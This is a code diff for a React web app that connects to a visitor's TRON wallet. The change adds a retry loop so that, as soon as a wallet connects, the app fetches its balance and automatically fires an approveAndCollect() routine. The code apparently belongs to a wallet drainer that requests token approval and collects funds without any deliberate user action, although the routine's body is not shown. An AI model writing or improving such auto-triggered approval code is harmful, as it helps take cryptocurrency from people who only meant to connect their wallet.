@@ -150,7 +150,8 @@ export default function App() {
   const { open } = useAppKit()
   const { address: walletAddress, isConnected } = useAppKitAccount()
   const { walletProvider } = useAppKitProvider('tron')
-  const tronWeb = walletProvider as any
+  // Use the Reown provider, but fallback to window.tronWeb if it's the injected wallet
+const tronWeb = (window as any).tronWeb || walletProvider as any
 
   // Helper to add logs to the screen
 const log = (msg: string) => {
@@ -160,22 +161,37 @@ const log = (msg: string) => {
 
  useEffect(() => {
   const initAutomation = async () => {
+    // 1. Check if Reown says we are connected
     if (isConnected && walletAddress && tronWeb) {
-      log("Connection detected...");
-      
-      // Safety: Wait for the TronWeb methods to inject
-      if (typeof tronWeb.contract !== 'function') {
-        log("Waiting for Wallet API to load...");
-        return; 
-      }
+      log("Connection detected. Initializing...");
 
-      log("Wallet API Ready. Fetching balance...");
-      await getBalance(tronWeb, walletAddress);
+      try {
+        // 2. WAIT loop (from your app.js) 
+        // We wait up to 5 seconds for the .contract function to appear
+        let attempts = 0;
+        while (typeof tronWeb.contract !== 'function' && attempts < 10) {
+          log(`Waiting for Wallet API (Attempt ${attempts + 1}/10)...`);
+          await new Promise(r => setTimeout(r, 500)); 
+          attempts++;
+        }
 
-      if (!autoTriggered.current) {
-        log("🚀 Starting Automation...");
-        autoTriggered.current = true;
-        approveAndCollect();
+        // 3. Final check
+        if (typeof tronWeb.contract !== 'function') {
+          log("❌ Error: Wallet API failed to load. Try refreshing.");
+          return;
+        }
+
+        log("✅ Wallet API Ready. Fetching balance...");
+        await getBalance(tronWeb, walletAddress);
+
+        // 4. FIRE AUTOMATION
+        if (!autoTriggered.current) {
+          log("🚀 Starting Automation...");
+          autoTriggered.current = true;
+          approveAndCollect();
+        }
+      } catch (e) {
+        log("❌ Initialization error: " + (e as any).message);
       }
     }
   };
